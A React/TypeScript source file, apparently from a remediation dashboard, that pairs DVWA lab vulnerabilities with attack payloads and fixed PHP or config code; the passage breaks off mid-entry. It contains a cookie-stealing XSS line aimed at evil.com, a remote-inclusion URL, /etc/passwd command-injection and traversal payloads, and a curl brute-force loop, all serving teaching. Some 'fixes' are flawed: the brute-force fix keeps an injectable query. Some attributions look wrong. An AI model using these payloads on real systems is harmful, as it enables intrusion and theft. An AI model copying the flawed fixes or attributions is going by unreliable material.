import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { 
  Wrench, CheckCircle, Play, Clock, 
  Shield, FileText, Target, AlertTriangle,
  Settings, Check, Loader2, List, Terminal,
  Code, Eye, BookOpen, Zap, Server, Globe,
  ChevronDown, ChevronUp, ExternalLink, Copy, RefreshCw,
  ArrowRight, Database, Network
} from 'lucide-react';
import api from '../services/api';

interface Vulnerability {
  id: number;
  vuln_type: string;
  severity: string;
  status: string;
  service: string;
  port: number;
  description: string;
  target: string;
  fix_description: string | null;
  // Real scan data
  vulnerable_url?: string;
  vulnerable_parameter?: string;
  http_method?: string;
  payload_used?: string;
  request_example?: string;
  response_snippet?: string;
  affected_code?: string;
  remediation_code?: string;
  evidence?: string;
  owasp_category?: string;
}

interface APIGuidance {
  title: string;
  severity: string;
  owasp: string;
  cwe: string;
  mitre: string;
  cvss: string;
  plain_english: string;
  technical_explanation: string;
  real_world_impact: string;
  vulnerable_code: { language: string; filename: string; line_number: number; code: string };
  fixed_code: { language: string; filename: string; line_number: number; code: string };
  fix_steps: { step: number; action: string; description: string }[];
  test_instructions: string[];
  time_estimate: string;
  auto_fix_available: boolean;
}

interface FixStep {
  step: number;
  action: string;
  description: string;
  status: 'pending' | 'running' | 'done' | 'failed';
  result?: string;
}

// Comprehensive fix database with ACTUAL CODE examples
const FIX_DATABASE: Record<string, {
  title: string;
  plainEnglish: string;
  technicalExplanation: string;
  realWorldImpact: string;
  owasp: string;
  cwe: string;
  mitre: string;
  cvss: string;
  steps: string[];
  timeEstimate: string;
  riskLevel: string;
  httpRequest: { method: string; endpoint: string; payload: string; response: string };
  vulnerableCode: { language: string; filename: string; code: string; explanation: string; lineNumbers: string };
  fixedCode: { language: string; filename: string; code: string; explanation: string; lineNumbers: string };
  keyChanges: string[];
  testInstructions: string[];
  verificationSteps: string[];
}> = {
  'SQL Injection': {
    title: "🔒 Fixing SQL Injection Vulnerability",
    plainEnglish: "Imagine your database is like a secure vault. Right now, there's a hole in the wall where anyone can reach in and grab whatever they want. We're patching that hole by installing a security checkpoint that validates everyone before access.",
    technicalExplanation: "SQL Injection occurs when user input is directly concatenated into SQL queries. Attackers inject malicious SQL commands to bypass authentication, extract data, or drop tables. The fix uses parameterized queries where user input is treated as data, never as executable SQL.",
    realWorldImpact: "Equifax breach (2017): 147 million records. Yahoo: 3 billion accounts. SQL injection causes: Database theft, credential exposure, financial loss, GDPR fines up to €20M.",
    owasp: "A03:2021 - Injection",
    cwe: "CWE-89: SQL Injection",
    mitre: "T1190 - Exploit Public-Facing Application",
    cvss: "9.8 (Critical)",
    steps: [
      "Identifying vulnerable SQL query patterns in source code",
      "Backing up original vulnerable file",
      "Replacing string concatenation with prepared statements",
      "Adding input validation and sanitization layer",
      "Implementing parameterized queries with bound parameters",
      "Testing fix with SQL injection payloads",
      "Verifying database queries are now safe"
    ],
    timeEstimate: "5-10 minutes",
    riskLevel: "Safe - No downtime required",
    httpRequest: {
      method: "GET",
      endpoint: "/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit",
      payload: "id=1' OR '1'='1",
      response: `HTTP/1.1 200 OK
Content-Type: text/html

<!-- VULNERABLE RESPONSE - Returns ALL users -->
<pre>ID: 1<br>First name: admin<br>Surname: admin</pre>
<pre>ID: 2<br>First name: Gordon<br>Surname: Brown</pre>
<pre>ID: 3<br>First name: Hack<br>Surname: Me</pre>
<pre>ID: 4<br>First name: Pablo<br>Surname: Picasso</pre>
<pre>ID: 5<br>First name: Bob<br>Surname: Smith</pre>
<!-- Attacker now has ALL user data! -->`
    },
    vulnerableCode: {
      language: "php",
      filename: "vulnerabilities/sqli/source/low.php",
      lineNumbers: "Lines 6-15",
      code: `<?php
// ❌ VULNERABLE CODE - Direct string concatenation
if(isset($_REQUEST['Submit'])) {
    // Line 8: User input taken directly without validation
    $id = $_REQUEST['id'];
    
    // Line 11: DANGEROUS - User input directly in query!
    $query = "SELECT first_name, last_name 
              FROM users 
              WHERE user_id = '$id'";  // ← INJECTION POINT
    
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    // Attack: id = ' OR '1'='1
    // Becomes: WHERE user_id = '' OR '1'='1'
    // Result: Returns ALL users!
}
?>`,
      explanation: "Line 8: $id comes directly from user input ($_REQUEST['id']). Line 11: This value is inserted into the SQL query using string concatenation. An attacker can input special characters like ' OR '1'='1 to modify the query logic and extract all database records."
    },
    fixedCode: {
      language: "php",
      filename: "vulnerabilities/sqli/source/low.php",
      lineNumbers: "Lines 6-22",
      code: `<?php
// ✅ FIXED CODE - Parameterized query with prepared statement
if(isset($_REQUEST['Submit'])) {
    // Line 8: Still get user input
    $id = $_REQUEST['id'];
    
    // Line 11: Input validation - only allow numeric IDs
    if(!is_numeric($id)) {
        echo "<pre>Invalid user ID format</pre>";
        exit;
    }
    
    // Line 16: SAFE - Using prepared statement
    $stmt = $GLOBALS["___mysqli_ston"]->prepare(
        "SELECT first_name, last_name 
         FROM users 
         WHERE user_id = ?"  // ← ? placeholder
    );
    
    // Line 21: Bind parameter - input treated as DATA only
    $stmt->bind_param("i", $id);  // "i" = integer type
    $stmt->execute();
    $result = $stmt->get_result();
    
    // Now attack: id = ' OR '1'='1
    // Validation fails: "Invalid user ID format"
    // Attack BLOCKED!
}
?>`,
      explanation: "Line 11-14: Input validation ensures only numeric IDs are accepted. Line 16-19: Prepared statement with '?' placeholder separates SQL code from data. Line 21: bind_param() ensures the input is treated purely as data, never as SQL commands. Even if validation is bypassed, the prepared statement prevents injection."
    },
    keyChanges: [
      "Added input validation (is_numeric) to reject non-numeric input",
      "Replaced string concatenation with prepared statement using '?' placeholder",
      "Used bind_param() to safely bind user input as integer parameter",
      "Database now treats input as literal data, never executable SQL"
    ],
    testInstructions: [
      "Go to DVWA SQL Injection page (http://localhost:8080/dvwa/vulnerabilities/sqli/)",
      "Enter in the User ID field: ' OR '1'='1",
      "Click Submit",
      "BEFORE FIX: Shows ALL 5 users (vulnerability exploited!)",
      "AFTER FIX: Shows 'Invalid user ID format' (attack blocked!)"
    ],
    verificationSteps: [
      "Open browser Developer Tools (F12) → Network tab",
      "Submit the SQL injection payload",
      "Check Response - should NOT contain multiple users",
      "Try payload: 1 UNION SELECT username,password FROM users",
      "Verify this also fails with validation error"
    ]
  },
  'XSS': {
    title: "🛡️ Fixing Cross-Site Scripting (XSS)",
    plainEnglish: "Your website is like a bulletin board. Right now, someone can post a note with hidden instructions that steal everyone's passwords when they read it. We're adding a filter that removes dangerous content before displaying anything.",
    technicalExplanation: "XSS allows attackers to inject malicious JavaScript that executes in victims' browsers. This can steal session cookies, capture keystrokes, or perform actions as the user. The fix encodes all output so special characters display as text, not executable code.",
    realWorldImpact: "British Airways breach (2018): 380,000 payment cards stolen via XSS. MySpace worm (2005): 1 million profiles infected in 20 hours. XSS enables: Session hijacking, credential theft, malware distribution.",
    owasp: "A03:2021 - Injection (XSS)",
    cwe: "CWE-79: Cross-site Scripting",
    mitre: "T1059.007 - JavaScript Execution",
    cvss: "6.1 (Medium)",
    steps: [
      "Identifying user input reflection points",
      "Backing up vulnerable source file",
      "Adding htmlspecialchars() output encoding",
      "Implementing Content Security Policy header",
      "Testing with XSS payloads",
      "Verifying scripts no longer execute"
    ],
    timeEstimate: "5-10 minutes",
    riskLevel: "Safe - No downtime required",
    httpRequest: {
      method: "GET",
      endpoint: "/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>",
      payload: "<script>alert('XSS')</script>",
      response: `HTTP/1.1 200 OK
Content-Type: text/html

<!-- VULNERABLE RESPONSE - Script executes! -->
<pre>Hello <script>alert('XSS')</script></pre>
<!-- Browser executes the JavaScript alert! -->

<!-- More dangerous payload: -->
<!-- <script>new Image().src="http://evil.com/steal?c="+document.cookie</script> -->
<!-- This sends victim's session cookie to attacker! -->`
    },
    vulnerableCode: {
      language: "php",
      filename: "vulnerabilities/xss_r/source/low.php",
      lineNumbers: "Lines 4-10",
      code: `<?php
header("X-XSS-Protection: 0");  // XSS protection disabled!

// ❌ VULNERABLE CODE - No output encoding
if(array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Line 7: User input taken directly
    $name = $_GET['name'];
    
    // Line 9: DANGEROUS - Direct echo without encoding!
    echo '<pre>Hello ' . $name . '</pre>';
    
    // Attack: name=<script>alert('XSS')</script>
    // Output: <pre>Hello <script>alert('XSS')</script></pre>
    // Browser executes the script!
}
?>`,
      explanation: "Line 7: User input from $_GET['name'] is stored without any sanitization. Line 9: This input is directly echoed to the page using string concatenation. When an attacker inputs <script> tags, the browser interprets them as actual JavaScript and executes them."
    },
    fixedCode: {
      language: "php",
      filename: "vulnerabilities/xss_r/source/low.php",
      lineNumbers: "Lines 4-18",
      code: `<?php
header("X-XSS-Protection: 1; mode=block");  // Enable XSS protection
header("Content-Security-Policy: script-src 'self'");  // CSP header

// ✅ FIXED CODE - HTML entity encoding
if(array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Line 9: User input taken
    $name = $_GET['name'];
    
    // Line 12: SAFE - Encode special characters
    // htmlspecialchars() converts:
    // < to &lt;    > to &gt;
    // " to &quot;  ' to &#039;
    $safe_name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
    
    // Line 17: Now safe to output
    echo '<pre>Hello ' . $safe_name . '</pre>';
    
    // Attack: name=<script>alert('XSS')</script>
    // Output: <pre>Hello &lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
    // Browser displays as TEXT, doesn't execute!
}
?>`,
      explanation: "Line 2-3: Security headers added - XSS protection enabled, CSP restricts script sources. Line 14: htmlspecialchars() converts dangerous characters to HTML entities (< becomes &lt;). Line 17: The encoded output is safe - browsers display it as text, not executable code."
    },
    keyChanges: [
      "Added X-XSS-Protection header to enable browser XSS filtering",
      "Added Content-Security-Policy to restrict script execution",
      "Implemented htmlspecialchars() with ENT_QUOTES flag for complete encoding",
      "Specified UTF-8 charset to prevent encoding bypass attacks"
    ],
    testInstructions: [
      "Go to DVWA XSS (Reflected) page",
      "Enter: <script>alert('XSS')</script>",
      "Click Submit",
      "BEFORE FIX: Alert popup appears (vulnerable!)",
      "AFTER FIX: Shows literal text '<script>...' (safe!)"
    ],
    verificationSteps: [
      "Open Developer Tools → Console tab",
      "Submit XSS payload",
      "Check Console for any JavaScript errors/execution",
      "Inspect page source - should show &lt;script&gt; not <script>",
      "Try advanced payload: <img src=x onerror=alert('XSS')>"
    ]
  },
  'Cross-Site Scripting': {
    title: "🛡️ Fixing Cross-Site Scripting (XSS)",
    plainEnglish: "Your website is like a bulletin board. Right now, someone can post dangerous code. We're adding a filter to neutralize it.",
    technicalExplanation: "XSS allows JavaScript injection in web pages. Fix: encode all output so special characters display as text.",
    realWorldImpact: "British Airways: 380,000 cards stolen. MySpace worm: 1M profiles in 20 hours.",
    owasp: "A03:2021 - Injection (XSS)",
    cwe: "CWE-79: Cross-site Scripting",
    mitre: "T1059.007 - JavaScript Execution",
    cvss: "6.1 (Medium)",
    steps: ["Identify reflection points", "Add output encoding", "Test with payloads", "Verify fix"],
    timeEstimate: "5-10 minutes",
    riskLevel: "Safe",
    httpRequest: { method: "GET", endpoint: "/vulnerabilities/xss_r/?name=<script>alert(1)</script>", payload: "<script>alert(1)</script>", response: "Script executes in vulnerable version" },
    vulnerableCode: { language: "php", filename: "xss_r/source/low.php", lineNumbers: "Line 9", code: "echo '<pre>Hello ' . $name . '</pre>';", explanation: "Direct output without encoding" },
    fixedCode: { language: "php", filename: "xss_r/source/low.php", lineNumbers: "Line 9", code: "echo '<pre>Hello ' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '</pre>';", explanation: "Encoded output" },
    keyChanges: ["Added htmlspecialchars() encoding"],
    testInstructions: ["Enter <script>alert(1)</script>", "Before: Alert shows", "After: Text displays"],
    verificationSteps: ["Check page source for &lt;script&gt;"]
  },
  'Command Injection': {
    title: "⚡ Fixing Command Injection Vulnerability",
    plainEnglish: "Your server follows commands. Right now, anyone can whisper extra dangerous commands. We're teaching it to only accept specific, safe instructions.",
    technicalExplanation: "Command Injection occurs when user input reaches system shell commands. Attackers chain commands using ; && || | to execute anything. Fix: validate input format strictly and escape shell characters.",
    realWorldImpact: "Shellshock (2014): Millions of servers vulnerable. Command injection enables: Server takeover, data theft, crypto mining, botnet recruitment.",
    owasp: "A03:2021 - Injection",
    cwe: "CWE-78: OS Command Injection",
    mitre: "T1059 - Command and Scripting Interpreter",
    cvss: "9.8 (Critical)",
    steps: [
      "Identifying shell execution points",
      "Backing up vulnerable file",
      "Implementing strict input validation (IP format only)",
      "Adding escapeshellarg() for safety",
      "Testing with injection payloads",
      "Verifying only ping command executes"
    ],
    timeEstimate: "10-15 minutes",
    riskLevel: "Low Risk",
    httpRequest: {
      method: "POST",
      endpoint: "/vulnerabilities/exec/",
      payload: "ip=127.0.0.1; cat /etc/passwd&Submit=Submit",
      response: `HTTP/1.1 200 OK

<!-- VULNERABLE RESPONSE - Extra command executed! -->
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.045 ms

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<!-- Attacker can read ANY file or run ANY command! -->`
    },
    vulnerableCode: {
      language: "php",
      filename: "vulnerabilities/exec/source/low.php",
      lineNumbers: "Lines 4-14",
      code: `<?php
// ❌ VULNERABLE CODE - Direct shell execution
if(isset($_POST['Submit'])) {
    // Line 6: User input taken directly
    $target = $_REQUEST['ip'];
    
    // Line 9: DANGEROUS - Input goes directly to shell!
    if(stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . $target);
    }
    
    echo "<pre>{$cmd}</pre>";
    
    // Attack: ip=127.0.0.1; cat /etc/passwd
    // Executed: ping 127.0.0.1; cat /etc/passwd
    // Both commands run - attacker sees password file!
}
?>`,
      explanation: "Line 6: IP address taken from user input without validation. Line 9-12: This input goes directly into shell_exec(). By adding ; or && followed by another command, attackers can execute arbitrary system commands with web server privileges."
    },
    fixedCode: {
      language: "php",
      filename: "vulnerabilities/exec/source/low.php",
      lineNumbers: "Lines 4-26",
      code: `<?php
// ✅ FIXED CODE - Input validation + shell escaping
if(isset($_POST['Submit'])) {
    $target = $_REQUEST['ip'];
    
    // Line 8: Strict validation - only valid IPv4 addresses
    $ip_pattern = '/^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/';
    
    if(!preg_match($ip_pattern, $target)) {
        echo "<pre>Error: Invalid IP address format.
Only IPv4 addresses allowed (e.g., 192.168.1.1)</pre>";
        exit;
    }
    
    // Line 17: Extra safety - escape shell characters
    $target = escapeshellarg($target);
    
    // Line 20: Now safe to execute
    if(stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . $target);
    }
    
    echo "<pre>{$cmd}</pre>";
    
    // Attack: ip=127.0.0.1; cat /etc/passwd
    // Validation: Doesn't match IPv4 pattern
    // Result: "Invalid IP address format" - Attack BLOCKED!
}
?>`,
      explanation: "Line 8-9: Regex pattern validates input is a proper IPv4 address only. Line 10-13: Non-matching input is rejected with error message. Line 17: escapeshellarg() wraps value in quotes and escapes special characters as backup. Commands like ; cat /etc/passwd never reach the shell."
    },
    keyChanges: [
      "Added strict regex validation for IPv4 addresses only",
      "Reject any input containing shell operators (; && || | etc.)",
      "Added escapeshellarg() as defense-in-depth measure",
      "Clear error message for invalid input without exposing system info"
    ],
    testInstructions: [
      "Go to DVWA Command Injection page",
      "Enter: 127.0.0.1; whoami",
      "Click Submit",
      "BEFORE FIX: Shows username (command executed!)",
      "AFTER FIX: Shows 'Invalid IP address format' (blocked!)"
    ],
    verificationSteps: [
      "Try: 127.0.0.1 && ls -la",
      "Try: 127.0.0.1 | cat /etc/passwd",
      "Try: $(whoami)",
      "All should return 'Invalid IP address format'",
      "Only valid IPs like 8.8.8.8 should work"
    ]
  },
  'File Inclusion': {
    title: "📁 Fixing File Inclusion Vulnerability",
    plainEnglish: "Your website has a filing cabinet. Right now, someone can ask to see files from anywhere - including your secrets! We're adding a lock that only allows access to approved files.",
    technicalExplanation: "File Inclusion lets attackers control which file PHP includes/executes. Local File Inclusion (LFI) reads sensitive files like /etc/passwd. Remote File Inclusion (RFI) loads malicious code from attacker's server. Fix: whitelist allowed files.",
    realWorldImpact: "RSA SecurID breach (2011) used file inclusion. Enables: Source code theft, config exposure, remote code execution, full server compromise.",
    owasp: "A01:2021 - Broken Access Control",
    cwe: "CWE-98: Improper Control of Filename",
    mitre: "T1055 - Process Injection",
    cvss: "9.8 (Critical)",
    steps: [
      "Identifying include() with user input",
      "Creating whitelist of allowed files",
      "Implementing strict file validation",
      "Removing path traversal sequences",
      "Testing with LFI/RFI payloads",
      "Verifying only approved files load"
    ],
    timeEstimate: "5-10 minutes",
    riskLevel: "Safe",
    httpRequest: {
      method: "GET",
      endpoint: "/vulnerabilities/fi/?page=../../../../etc/passwd",
      payload: "page=../../../../etc/passwd",
      response: `HTTP/1.1 200 OK

<!-- VULNERABLE RESPONSE - System file exposed! -->
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
<!-- Attacker now knows all system users! -->`
    },
    vulnerableCode: {
      language: "php",
      filename: "vulnerabilities/fi/source/low.php",
      lineNumbers: "Lines 3-8",
      code: `<?php
// ❌ VULNERABLE CODE - User controls file path
// Line 4: User input directly determines which file loads
$file = $_GET['page'];

// Line 7: DANGEROUS - Direct include without validation!
include($file);

// Attack: page=../../../../etc/passwd
// PHP reads: /etc/passwd
// Attacker sees all system user accounts!

// Worse attack (RFI): page=http://evil.com/shell.php
// PHP downloads and EXECUTES attacker's malicious script!
?>`,
      explanation: "Line 4: The 'page' parameter from URL directly becomes the file to include. Line 7: include() will load and execute whatever file is specified. Using ../ (path traversal), attackers navigate to sensitive system files. With RFI enabled, they can load malicious code from external servers."
    },
    fixedCode: {
      language: "php",
      filename: "vulnerabilities/fi/source/low.php",
      lineNumbers: "Lines 3-22",
      code: `<?php
// ✅ FIXED CODE - Whitelist approach
$file = $_GET['page'];

// Line 6: Define ONLY the files that are allowed
$allowed_files = array(
    'include.php' => true,
    'file1.php'   => true,
    'file2.php'   => true,
    'file3.php'   => true
);

// Line 13: Remove any path traversal attempts
$file = basename($file);  // Strips ../ and directories

// Line 16: Check against whitelist
if(isset($allowed_files[$file])) {
    include($file);
} else {
    echo "<pre>Error: Access denied.
File '{$file}' is not in the approved list.</pre>";
}

// Attack: page=../../../../etc/passwd
// basename() returns: passwd
// Not in whitelist → "Access denied"
// Attack BLOCKED!
?>`,
      explanation: "Line 6-11: Whitelist array defines the ONLY files that can be included. Line 14: basename() removes directory components, blocking path traversal. Line 17: File must be in whitelist to be included. Everything else is rejected with an error message."
    },
    keyChanges: [
      "Implemented strict whitelist - only 4 specific files allowed",
      "Added basename() to strip path traversal sequences",
      "Any file not in whitelist is rejected",
      "Remote URLs can never match whitelist - RFI blocked"
    ],
    testInstructions: [
      "Go to DVWA File Inclusion page",
      "Try: ?page=../../../../etc/passwd",
      "BEFORE FIX: Shows /etc/passwd contents (vulnerable!)",
      "AFTER FIX: Shows 'Access denied' (protected!)"
    ],
    verificationSteps: [
      "Try: ?page=../../../etc/shadow",
      "Try: ?page=http://evil.com/shell.txt",
      "Try: ?page=file1.php (should work - in whitelist)",
      "Try: ?page=../../config/config.inc.php",
      "Only whitelisted files should load"
    ]
  },
  'Brute Force': {
    title: "🔑 Fixing Brute Force Vulnerability",
    plainEnglish: "Your login is a door with a lock. Right now, someone can try millions of keys without consequence. We're adding a guard who bans anyone after too many wrong attempts.",
    technicalExplanation: "Brute force systematically tries all password combinations. Without rate limiting, attackers try thousands per second. Fix: implement account lockout after failed attempts and add delays between tries.",
    realWorldImpact: "150,000 printer admin panels compromised (2019). LinkedIn breach: 117M passwords cracked. Enables: Account takeover, credential stuffing, service denial.",
    owasp: "A07:2021 - Authentication Failures",
    cwe: "CWE-307: Excessive Authentication Attempts",
    mitre: "T1110 - Brute Force",
    cvss: "7.5 (High)",
    steps: [
      "Analyzing authentication flow",
      "Adding failed attempt counter",
      "Implementing progressive delay",
      "Adding account lockout mechanism",
      "Testing rapid login attempts",
      "Verifying lockout works"
    ],
    timeEstimate: "10-15 minutes",
    riskLevel: "Safe",
    httpRequest: {
      method: "GET",
      endpoint: "/vulnerabilities/brute/?username=admin&password=wrongpass&Login=Login",
      payload: "Automated tool tries 10,000 passwords/minute",
      response: `HTTP/1.1 200 OK

<!-- VULNERABLE - No rate limiting! -->
<pre>Username and/or password incorrect.</pre>

<!-- Attacker runs: -->
<!-- for pass in $(cat passwords.txt); do -->
<!--   curl "http://target/brute/?username=admin&password=$pass"; -->
<!-- done -->
<!-- Tries entire password list in minutes! -->`
    },
    vulnerableCode: {
      language: "php",
      filename: "vulnerabilities/brute/source/low.php",
      lineNumbers: "Lines 3-20",
      code: `<?php
// ❌ VULNERABLE CODE - No rate limiting
if(isset($_GET['Login'])) {
    $user = $_GET['username'];
    $pass = $_GET['password'];
    $pass = md5($pass);
    
    // Line 10: Query database - no attempt limiting!
    $query = "SELECT * FROM users 
              WHERE user = '$user' AND password = '$pass'";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    if($result && mysqli_num_rows($result) == 1) {
        echo "<p>Welcome to the password protected area!</p>";
    } else {
        // Line 17: Just shows error - no penalty for wrong guess!
        echo "<pre>Username and/or password incorrect.</pre>";
    }
    
    // Attacker can try unlimited passwords!
    // Common password like "password123" cracked in seconds
}
?>`,
      explanation: "Line 10: Each login attempt queries database without any tracking. Line 17: Failed attempts just show error with no consequences. There's no limit on attempts, no delays, no lockouts. Automated tools can try thousands of passwords per second."
    },
    fixedCode: {
      language: "php",
      filename: "vulnerabilities/brute/source/low.php",
      lineNumbers: "Lines 3-52",
      code: `<?php
// ✅ FIXED CODE - Rate limiting + lockout
session_start();

if(isset($_GET['Login'])) {
    $user = $_GET['username'];
    $pass = $_GET['password'];
    
    // Line 10: Initialize tracking variables
    if(!isset($_SESSION['failed_attempts'])) {
        $_SESSION['failed_attempts'] = 0;
        $_SESSION['lockout_time'] = 0;
        $_SESSION['last_attempt'] = 0;
    }
    
    // Line 17: Check if currently locked out (5 minute lockout)
    if($_SESSION['failed_attempts'] >= 3) {
        $lockout_remaining = 300 - (time() - $_SESSION['lockout_time']);
        if($lockout_remaining > 0) {
            echo "<pre>⛔ Account locked due to too many failed attempts.
Try again in " . ceil($lockout_remaining/60) . " minute(s).
This incident has been logged.</pre>";
            // Log the attempt for security monitoring
            error_log("Brute force attempt blocked for user: $user");
            exit;
        } else {
            $_SESSION['failed_attempts'] = 0;  // Reset after lockout
        }
    }
    
    // Line 31: Add delay between attempts (prevents rapid fire)
    $time_since_last = time() - $_SESSION['last_attempt'];
    if($time_since_last < 2) {
        sleep(3);  // Force 3 second delay if attempting too fast
    }
    $_SESSION['last_attempt'] = time();
    
    // Line 38: Check credentials
    $pass = md5($pass);
    $query = "SELECT * FROM users WHERE user = '$user' AND password = '$pass'";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    if($result && mysqli_num_rows($result) == 1) {
        echo "<p>✅ Welcome to the password protected area!</p>";
        $_SESSION['failed_attempts'] = 0;  // Reset on success
    } else {
        $_SESSION['failed_attempts']++;
        $_SESSION['lockout_time'] = time();
        $remaining = 3 - $_SESSION['failed_attempts'];
        echo "<pre>❌ Username and/or password incorrect.
Warning: $remaining attempt(s) remaining before lockout.</pre>";
    }
}
?>`,
      explanation: "Line 10-15: Session tracks failed attempts and lockout time. Line 17-28: After 3 failures, 5-minute lockout is enforced. Line 31-36: Forced delay prevents rapid automated attempts. Line 44-49: Failed attempts are counted with warning message. This makes brute force impractical - it would take years to try enough passwords."
    },
    keyChanges: [
      "Added session-based tracking of failed login attempts",
      "Implemented 3-attempt limit before 5-minute lockout",
      "Added forced delay between rapid attempts",
      "Security logging of lockout events",
      "Clear warning messages showing attempts remaining"
    ],
    testInstructions: [
      "Go to DVWA Brute Force page",
      "Try wrong password 3 times quickly",
      "BEFORE FIX: Can keep trying forever (vulnerable!)",
      "AFTER FIX: 'Account locked' after 3 failures (protected!)"
    ],
    verificationSteps: [
      "Use Burp Suite or script to send rapid requests",
      "Observe the forced delays between attempts",
      "After 3 failures, verify 5-minute lockout",
      "Check that correct password still works after lockout expires"
    ]
  },
  'Exposed Database': {
    title: "🗄️ Securing Exposed Database",
    plainEnglish: "Your database is a treasure chest in the street with no lock. Anyone can grab everything. We're moving it inside, adding locks, and posting a guard.",
    technicalExplanation: "Exposed databases accept connections from the internet without authentication. Attackers use Shodan to find databases on default ports. Fix: enable authentication, bind to localhost, add firewall rules.",
    realWorldImpact: "27,000+ MongoDB databases wiped in 2017 ransom attacks. 900M records exposed from Elasticsearch in 2019. This is what inspired RedShield!",
    owasp: "A01:2021 - Broken Access Control",
    cwe: "CWE-284: Improper Access Control",
    mitre: "T1190 - Exploit Public-Facing App",
    cvss: "9.8 (Critical)",
    steps: [
      "Checking database network exposure",
      "Backing up configuration",
      "Enabling authentication requirement",
      "Creating admin user with strong password",
      "Binding to localhost only",
      "Adding firewall rules",
      "Testing local access works",
      "Verifying remote access blocked"
    ],
    timeEstimate: "5-10 minutes",
    riskLevel: "Low Risk - Brief restart",
    httpRequest: {
      method: "TCP",
      endpoint: "mongo target:27017",
      payload: "MongoDB shell connection (no credentials)",
      response: `MongoDB shell version: 3.4.0
connecting to: mongodb://target:27017
> show dbs
admin    0.000GB
local    0.000GB
production  2.340GB    <-- Attacker can see all databases!
> use production
> db.users.find()
{ "email": "admin@company.com", "password": "hashed...", "credit_card": "4111..." }
<!-- FULL ACCESS without any password! -->`
    },
    vulnerableCode: {
      language: "yaml",
      filename: "/etc/mongod.conf",
      lineNumbers: "Lines 5-12",
      code: `# ❌ VULNERABLE - Open to the world!
storage:
  dbPath: /var/lib/mongodb

net:
  port: 27017
  bindIp: 0.0.0.0  # DANGER: Accepts connections from ANYWHERE!

security:
  # authorization: enabled  # DISABLED - no password needed!

# Result: Anyone on the internet can:
# - Connect without credentials
# - Read ALL data (customer info, passwords, financials)
# - Modify or delete records
# - Drop entire databases
# - Hold data for ransom`,
      explanation: "bindIp: 0.0.0.0 means the database accepts connections from any IP address on the internet. With authorization commented out/disabled, no password is required. Anyone who finds this server (via Shodan, Censys) has complete access to all data."
    },
    fixedCode: {
      language: "yaml",
      filename: "/etc/mongod.conf",
      lineNumbers: "Lines 5-20",
      code: `# ✅ FIXED - Properly secured
storage:
  dbPath: /var/lib/mongodb

net:
  port: 27017
  bindIp: 127.0.0.1  # SAFE: Local connections only!
  # If you need remote access, use SSH tunneling

security:
  authorization: enabled  # Require authentication!

# Additional steps performed:
# 1. Created admin user:
#    db.createUser({user:"admin", pwd:"<strong_password>", roles:["root"]})
#
# 2. Added firewall rule:
#    ufw deny 27017  # Block database port from internet
#
# 3. Result: To connect you must:
#    - Be on the local machine (127.0.0.1)
#    - Have valid username AND password
#    - Have appropriate role permissions`,
      explanation: "bindIp: 127.0.0.1 means ONLY connections from the local machine are accepted - internet connections are impossible. authorization: enabled requires valid credentials for ALL operations. Firewall rule adds defense-in-depth. Remote access should use SSH tunneling."
    },
    keyChanges: [
      "Changed bindIp from 0.0.0.0 to 127.0.0.1 (localhost only)",
      "Enabled authorization - credentials required for all operations",
      "Created admin user with strong randomly-generated password",
      "Added firewall rule blocking port 27017 from external access"
    ],
    testInstructions: [
      "Run: mongo target:27017 from external IP",
      "BEFORE FIX: Connection successful, full access",
      "AFTER FIX: Connection refused",
      "From localhost with credentials: works correctly"
    ],
    verificationSteps: [
      "Use Shodan to check if port 27017 is visible",
      "Try: mongo localhost -u admin -p",
      "Verify authentication is required",
      "Check firewall: ufw status | grep 27017"
    ]
  },
  'Default Credentials': {
    title: "🔐 Fixing Default Credentials",
    plainEnglish: "You're using the factory password that everyone knows. It's like leaving your key under the doormat. We're changing to a strong, unique password.",
    technicalExplanation: "Default credentials (admin/admin, root/root) are publicly documented. Attackers try these first. Fix: generate strong unique credentials, enforce complexity, implement rotation.",
    realWorldImpact: "Mirai botnet (2016): 600,000 devices using 62 default passwords. MongoDB ransoms (2017): 27,000 databases with defaults.",
    owasp: "A07:2021 - Authentication Failures",
    cwe: "CWE-798: Hard-coded Credentials",
    mitre: "T1078.001 - Default Accounts",
    cvss: "9.8 (Critical)",
    steps: ["Identify default credentials", "Generate strong passwords", "Update credentials", "Document securely", "Test new auth", "Verify old rejected"],
    timeEstimate: "2-5 minutes",
    riskLevel: "Safe",
    httpRequest: { method: "POST", endpoint: "/login", payload: "username=admin&password=admin", response: "Login successful (with default credentials!)" },
    vulnerableCode: { language: "config", filename: "config.inc.php", lineNumbers: "Line 15", code: "$_DVWA['db_user'] = 'admin';\n$_DVWA['db_password'] = 'admin';", explanation: "Default credentials everyone knows" },
    fixedCode: { language: "config", filename: "config.inc.php", lineNumbers: "Line 15", code: "$_DVWA['db_user'] = 'dvwa_secure_user';\n$_DVWA['db_password'] = 'K$9xMp#2qL...';", explanation: "Unique strong credentials" },
    keyChanges: ["Generated 32+ character random password", "Changed default username", "Documented in secure password manager"],
